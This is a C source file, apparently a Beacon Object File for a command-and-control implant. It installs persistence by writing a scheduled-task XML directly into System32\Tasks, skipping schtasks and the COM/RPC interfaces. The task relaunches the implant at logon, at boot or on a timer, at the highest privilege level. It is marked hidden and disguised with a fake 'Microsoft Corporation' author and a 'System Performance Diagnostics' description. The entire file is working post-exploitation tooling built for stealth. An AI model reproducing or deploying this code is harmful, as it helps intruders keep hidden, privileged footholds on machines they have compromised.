/*
 * schtask_persist_xml.c - Scheduled Task via direct XML file drop.
 *
 * Writes task XML directly to %windir%\System32\Tasks\<name>.
 * No registry, no COM, no RPC, no schtasks.exe — pure file write.
 * Task Scheduler service auto-loads new XML files on scan.
 * Requires Administrator/SYSTEM privileges for write access.
 *
 * Args (single string via Beacon Data API):
 *   "<task_name> <schedule>"
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -c schtask_persist_xml.c -o schtask_persist_xml.o
 */

#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetModuleFileNameA(HMODULE, LPSTR, DWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetWindowsDirectoryA(LPSTR, DWORD);
DECLSPEC_IMPORT void   WINAPI KERNEL32$GetLocalTime(LPSYSTEMTIME);
DECLSPEC_IMPORT int    WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);

/* ── Helpers ── */
static void bof_memcpy(void* d, const void* s, unsigned long long n) {
    unsigned char* pd = (unsigned char*)d;
    const unsigned char* ps = (const unsigned char*)s;
    while (n--) *pd++ = *ps++;
}
static int bof_strlen(const char* s) { int n = 0; while (s[n]) n++; return n; }
static char bof_upper(char c) { return (c >= 'a' && c <= 'z') ? c - 32 : c; }
static int bof_strcmp(const char* a, const char* b) {
    while (*a && *b && *a == *b) { a++; b++; }
    return (unsigned char)*a - (unsigned char)*b;
}
static int sa(char* dst, int pos, const char* src) {
    int len = bof_strlen(src); bof_memcpy(dst + pos, src, len); return pos + len;
}
static int bof_itoa(int val, char* buf) {
    if (val <= 0) { buf[0] = '0'; return 1; }
    char tmp[12]; int i = 0;
    while (val > 0) { tmp[i++] = '0' + val % 10; val /= 10; }
    for (int j = 0; j < i; j++) buf[j] = tmp[i - 1 - j];
    return i;
}
static int d2(char* b, int v) { b[0] = '0' + v / 10; b[1] = '0' + v % 10; return 2; }

static int parse_mo(const char* s) {
    for (const char* p = s; *p; p++) {
        if ((p[0] == '/' || p[0] == '-') &&
            bof_upper(p[1]) == 'M' && bof_upper(p[2]) == 'O' &&
            (p[3] == ' ' || p[3] == ':')) {
            p += 4; while (*p == ' ') p++;
            int v = 0;
            while (*p >= '0' && *p <= '9') { v = v * 10 + (*p - '0'); p++; }
            return v > 0 ? v : 1;
        }
    }
    return 1;
}

static void parse_st(const char* s, int* hh, int* mm) {
    *hh = 0; *mm = 0;
    for (const char* p = s; *p; p++) {
        if ((p[0] == '/' || p[0] == '-') &&
            bof_upper(p[1]) == 'S' && bof_upper(p[2]) == 'T' &&
            (p[3] == ' ' || p[3] == ':')) {
            p += 4; while (*p == ' ') p++;
            if (p[0] && p[1] && p[2] == ':' && p[3] && p[4]) {
                *hh = (p[0] - '0') * 10 + (p[1] - '0');
                *mm = (p[3] - '0') * 10 + (p[4] - '0');
            }
            return;
        }
    }
}

void go(char* args, int alen)
{
    /* ── 1. Parse args ── */
    char* input = NULL;
    int input_len = 0;
    if (args && alen >= 2) {
        datap parser;
        BeaconDataParse(&parser, args, alen);
        input = BeaconDataExtract(&parser, &input_len);
    }
    if (!input || input_len <= 0) {
        BeaconOutput(CALLBACK_ERROR,
            "Usage: <task_name> <schedule>\nExample: WindowsUpdate ONLOGON\n", 61);
        return;
    }

    char raw[512];
    if (input_len >= (int)sizeof(raw)) input_len = sizeof(raw) - 1;
    bof_memcpy(raw, input, input_len);
    raw[input_len] = '\0';

    char* sp = NULL;
    for (int i = 0; i < input_len; i++) {
        if (raw[i] == ' ') { sp = raw + i; break; }
    }
    if (!sp) {
        BeaconOutput(CALLBACK_ERROR,
            "Usage: <task_name> <schedule>\nExample: WindowsUpdate ONLOGON\n", 61);
        return;
    }
    *sp = '\0';
    char* task_name = raw;
    int tname_len = bof_strlen(task_name);
    char* schedule = sp + 1;
    while (*schedule == ' ') schedule++;
    if (!*schedule) {
        BeaconOutput(CALLBACK_ERROR, "Missing schedule\n", 17);
        return;
    }

    char stype[16]; int si = 0;
    while (schedule[si] && schedule[si] != ' ' && si < 15) {
        stype[si] = bof_upper(schedule[si]); si++;
    }
    stype[si] = '\0';
    char* params = schedule + si;
    while (*params == ' ') params++;

    /* ── 2. Get exe path ── */
    char exe_path[512];
    DWORD elen = KERNEL32$GetModuleFileNameA(NULL, exe_path, sizeof(exe_path));
    if (elen == 0 || elen >= sizeof(exe_path)) {
        BeaconOutput(CALLBACK_ERROR, "GetModuleFileName failed\n", 24);
        return;
    }
    exe_path[elen] = '\0';

    /* ── 3. Get windows directory ── */
    char windir[260];
    DWORD wdlen = KERNEL32$GetWindowsDirectoryA(windir, sizeof(windir));
    if (wdlen == 0) {
        BeaconOutput(CALLBACK_ERROR, "GetWindowsDirectory failed\n", 26);
        return;
    }

    SYSTEMTIME st;
    KERNEL32$GetLocalTime(&st);

    /* ── 4. Build task XML ── */
    char xml[4096];
    int xp = 0;

    xp = sa(xml, xp, "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\r\n");
    xp = sa(xml, xp, "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\r\n");
    xp = sa(xml, xp, "  <RegistrationInfo>\r\n");
    xp = sa(xml, xp, "    <Author>Microsoft Corporation</Author>\r\n");
    xp = sa(xml, xp, "    <Description>System Performance Diagnostics</Description>\r\n");
    xp = sa(xml, xp, "    <Date>");
    xp += bof_itoa(st.wYear, xml + xp); xml[xp++] = '-';
    xp += d2(xml + xp, st.wMonth); xml[xp++] = '-';
    xp += d2(xml + xp, st.wDay); xml[xp++] = 'T';
    xp += d2(xml + xp, st.wHour); xml[xp++] = ':';
    xp += d2(xml + xp, st.wMinute); xml[xp++] = ':';
    xp += d2(xml + xp, st.wSecond);
    xp = sa(xml, xp, "</Date>\r\n");
    xp = sa(xml, xp, "  </RegistrationInfo>\r\n");

    /* Triggers */
    xp = sa(xml, xp, "  <Triggers>\r\n");
    if (bof_strcmp(stype, "ONLOGON") == 0) {
        xp = sa(xml, xp, "    <LogonTrigger>\r\n");
        xp = sa(xml, xp, "      <Enabled>true</Enabled>\r\n");
        xp = sa(xml, xp, "    </LogonTrigger>\r\n");
    } else if (bof_strcmp(stype, "ONSTART") == 0) {
        xp = sa(xml, xp, "    <BootTrigger>\r\n");
        xp = sa(xml, xp, "      <Enabled>true</Enabled>\r\n");
        xp = sa(xml, xp, "    </BootTrigger>\r\n");
    } else if (bof_strcmp(stype, "MINUTE") == 0 || bof_strcmp(stype, "HOURLY") == 0 ||
               bof_strcmp(stype, "DAILY") == 0) {
        int mo = parse_mo(params);
        xp = sa(xml, xp, "    <TimeTrigger>\r\n");
        xp = sa(xml, xp, "      <StartBoundary>");
        xp += bof_itoa(st.wYear, xml + xp); xml[xp++] = '-';
        xp += d2(xml + xp, st.wMonth); xml[xp++] = '-';
        xp += d2(xml + xp, st.wDay); xml[xp++] = 'T';
        xp += d2(xml + xp, st.wHour); xml[xp++] = ':';
        xp += d2(xml + xp, st.wMinute); xml[xp++] = ':';
        xp = sa(xml, xp, "00</StartBoundary>\r\n");
        xp = sa(xml, xp, "      <Enabled>true</Enabled>\r\n");
        xp = sa(xml, xp, "      <Repetition>\r\n");
        xp = sa(xml, xp, "        <Interval>P");
        if (bof_strcmp(stype, "DAILY") == 0) {
            xp += bof_itoa(mo, xml + xp); xml[xp++] = 'D';
        } else {
            xml[xp++] = 'T';
            xp += bof_itoa(mo, xml + xp);
            xml[xp++] = (bof_strcmp(stype, "HOURLY") == 0) ? 'H' : 'M';
        }
        xp = sa(xml, xp, "</Interval>\r\n");
        xp = sa(xml, xp, "        <Duration>P10000D</Duration>\r\n");
        xp = sa(xml, xp, "        <StopAtDurationEnd>false</StopAtDurationEnd>\r\n");
        xp = sa(xml, xp, "      </Repetition>\r\n");
        xp = sa(xml, xp, "    </TimeTrigger>\r\n");
    } else if (bof_strcmp(stype, "ONCE") == 0) {
        int hh = 0, mm = 0;
        parse_st(params, &hh, &mm);
        xp = sa(xml, xp, "    <TimeTrigger>\r\n");
        xp = sa(xml, xp, "      <StartBoundary>");
        xp += bof_itoa(st.wYear, xml + xp); xml[xp++] = '-';
        xp += d2(xml + xp, st.wMonth); xml[xp++] = '-';
        xp += d2(xml + xp, st.wDay); xml[xp++] = 'T';
        xp += d2(xml + xp, hh); xml[xp++] = ':';
        xp += d2(xml + xp, mm); xml[xp++] = ':';
        xp = sa(xml, xp, "00</StartBoundary>\r\n");
        xp = sa(xml, xp, "      <Enabled>true</Enabled>\r\n");
        xp = sa(xml, xp, "    </TimeTrigger>\r\n");
    } else {
        BeaconOutput(CALLBACK_ERROR,
            "Unknown schedule. Use: ONLOGON ONSTART MINUTE HOURLY DAILY ONCE\n", 64);
        return;
    }
    xp = sa(xml, xp, "  </Triggers>\r\n");

    /* Principals */
    xp = sa(xml, xp, "  <Principals>\r\n");
    xp = sa(xml, xp, "    <Principal id=\"Author\">\r\n");
    xp = sa(xml, xp, "      <LogonType>InteractiveToken</LogonType>\r\n");
    xp = sa(xml, xp, "      <RunLevel>HighestAvailable</RunLevel>\r\n");
    xp = sa(xml, xp, "    </Principal>\r\n");
    xp = sa(xml, xp, "  </Principals>\r\n");

    /* Settings */
    xp = sa(xml, xp, "  <Settings>\r\n");
    xp = sa(xml, xp, "    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\r\n");
    xp = sa(xml, xp, "    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\r\n");
    xp = sa(xml, xp, "    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\r\n");
    xp = sa(xml, xp, "    <AllowHardTerminate>true</AllowHardTerminate>\r\n");
    xp = sa(xml, xp, "    <StartWhenAvailable>true</StartWhenAvailable>\r\n");
    xp = sa(xml, xp, "    <AllowStartOnDemand>true</AllowStartOnDemand>\r\n");
    xp = sa(xml, xp, "    <Enabled>true</Enabled>\r\n");
    xp = sa(xml, xp, "    <Hidden>true</Hidden>\r\n");
    xp = sa(xml, xp, "    <RunOnlyIfIdle>false</RunOnlyIfIdle>\r\n");
    xp = sa(xml, xp, "    <WakeToRun>false</WakeToRun>\r\n");
    xp = sa(xml, xp, "    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\r\n");
    xp = sa(xml, xp, "    <Priority>7</Priority>\r\n");
    xp = sa(xml, xp, "  </Settings>\r\n");

    /* Actions */
    xp = sa(xml, xp, "  <Actions Context=\"Author\">\r\n");
    xp = sa(xml, xp, "    <Exec>\r\n");
    xp = sa(xml, xp, "      <Command>");
    bof_memcpy(xml + xp, exe_path, elen); xp += elen;
    xp = sa(xml, xp, "</Command>\r\n");
    xp = sa(xml, xp, "    </Exec>\r\n");
    xp = sa(xml, xp, "  </Actions>\r\n");
    xp = sa(xml, xp, "</Task>\r\n");
    xml[xp] = '\0';

    /* ── 5. Convert to UTF-16LE ── */
    WCHAR wxml[4096];
    int wlen = KERNEL32$MultiByteToWideChar(0, 0, xml, xp, wxml, 4096);
    if (wlen <= 0) {
        BeaconOutput(CALLBACK_ERROR, "UTF-16 conversion failed\n", 25);
        return;
    }

    /* ── 6. Build file path ── */
    char fpath[768];
    int fp = 0;
    bof_memcpy(fpath + fp, windir, wdlen); fp += wdlen;
    fp = sa(fpath, fp, "\\System32\\Tasks\\");
    bof_memcpy(fpath + fp, task_name, tname_len); fp += tname_len;
    fpath[fp] = '\0';

    /* ── 7. Write UTF-16LE XML with BOM ── */
    HANDLE hFile = KERNEL32$CreateFileA(fpath,
        0x40000000L /* GENERIC_WRITE */, 0, NULL,
        2 /* CREATE_ALWAYS */, 0x80 /* NORMAL */, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconOutput(CALLBACK_ERROR,
            "CreateFile failed — need Admin/SYSTEM to write System32\\Tasks\\\n", 62);
        return;
    }

    DWORD written;
    unsigned char bom[2] = { 0xFF, 0xFE };
    KERNEL32$WriteFile(hFile, bom, 2, &written, NULL);
    KERNEL32$WriteFile(hFile, wxml, wlen * 2, &written, NULL);
    KERNEL32$CloseHandle(hFile);

    /* ── 8. Report ── */
    {
        char msg[768]; int mp = 0;
        mp = sa(msg, mp, "[XML] Task file written: ");
        bof_memcpy(msg + mp, fpath, fp); mp += fp;
        msg[mp++] = '\n';
        mp = sa(msg, mp, "[XML] EXE: ");
        bof_memcpy(msg + mp, exe_path, elen); mp += elen;
        msg[mp++] = '\n';
        mp = sa(msg, mp, "[XML] Schedule: ");
        int slen = bof_strlen(schedule);
        bof_memcpy(msg + mp, schedule, slen); mp += slen;
        msg[mp++] = '\n';
        mp = sa(msg, mp, "[XML] Hidden=true | Task Scheduler will load on next scan/reboot\n");
        BeaconOutput(CALLBACK_OUTPUT, msg, mp);
    }
}
